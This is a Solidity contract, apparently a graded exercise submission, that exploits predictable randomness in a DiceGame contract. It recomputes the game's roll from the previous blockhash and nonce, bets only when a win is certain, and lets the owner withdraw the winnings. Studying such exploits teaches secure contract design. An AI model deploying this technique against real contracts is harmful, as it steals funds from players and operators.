pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Withdraw function to transfer Ether from this contract to a specified address.
    function withdraw(address payable _to, uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Insufficient balance");
        (bool sent, ) = _to.call{ value: amount }("");
        require(sent, "Withdrawal failed");
    }

    // riggedRoll() predicts the outcome of DiceGame's roll and only calls rollTheDice if a win is guaranteed.
    function riggedRoll() external onlyOwner {
        // Ensure the contract has enough balance to send the required .002 ETH.
        require(address(this).balance >= 0.002 ether, "Not enough funds in RiggedRoll");

        // Predict the DiceGame outcome using the same algorithm.
        uint256 currentNonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        // Note: Use the DiceGame contract address here, because inside DiceGame, address(this) is its own address.
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), currentNonce));
        uint256 roll = uint256(hash) % 16;
        console.log("Predicted roll:", roll);

        // If the predicted roll is not a winning one (winning if roll <= 5), do not call rollTheDice().
        if (roll > 5) {
            console.log("Roll not favorable. Aborting riggedRoll.");
            return;
        }

        // Call rollTheDice with the required minimum value of 0.002 ETH.
        diceGame.rollTheDice{ value: 0.002 ether }();
    }

    // The receive() function enables the contract to accept incoming Ether.
    receive() external payable {
        console.log("RiggedRoll received:", msg.value);
    }
}
